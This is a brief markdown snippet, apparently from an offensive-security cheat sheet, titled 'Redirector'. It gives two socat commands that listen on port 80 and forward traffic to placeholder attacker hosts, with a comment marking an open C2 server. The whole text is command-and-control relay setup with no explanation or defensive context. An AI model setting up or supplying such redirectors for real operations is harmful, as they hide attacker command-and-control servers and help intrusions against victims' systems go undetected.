# Redirector

## socat

```bash
# Attacker 1
socat TCP4-LISTEN:80,fork TCP4:attackerIP:80
socat TCP4-LISTEN:80,fork TCP4:attackerIP2:80
#TCP 80 open Server C2
```